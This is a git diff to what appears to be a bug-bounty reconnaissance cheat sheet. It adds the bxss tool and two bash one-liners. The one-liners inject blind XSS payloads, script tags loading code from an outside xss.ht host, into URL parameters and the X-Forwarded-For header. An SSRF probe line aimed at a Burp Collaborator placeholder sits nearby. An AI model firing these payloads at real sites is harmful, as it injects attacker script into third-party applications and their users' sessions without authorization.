@@ -439,7 +439,8 @@ host -t CNAME input.com
 
 > Find reflected params
  - [gxss](https://github.com/KathanP19/Gxss) - A tool to check a bunch of URLs that contain reflecting params. 
- - [freq](https://github.com/takshal/freq) - This is go CLI tool for send fast Multiple get HTTP request. 
+ - [freq](https://github.com/takshal/freq) - This is go CLI tool for send fast Multiple get HTTP request.
+ - [bxss](https://github.com/ethicalhackingplayground/bxss/) - A Blind XSS Injector tool
  
 > Find js file from waybackurls.txt
  - [subjs](https://github.com/lc/subjs)
@@ -791,6 +792,16 @@ cat finalwaybackurls | uro | tee ./uro && cat uro | wc -l
 ```bash
 cat finalwaybackurls | grep "=" | qsreplace https://YOUR.burpcollaborator.net | httpx -silent -sc -cl -location -rt
 ```
+> Blind XSS In Parameters
+```bash
+cat finalwaybackurls | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+```
+> Blind XSS In X-Forwarded-For Header
+```bash
+cat finalwaybackurls | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"
+```
+
+
 ```bash
 cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
 ```
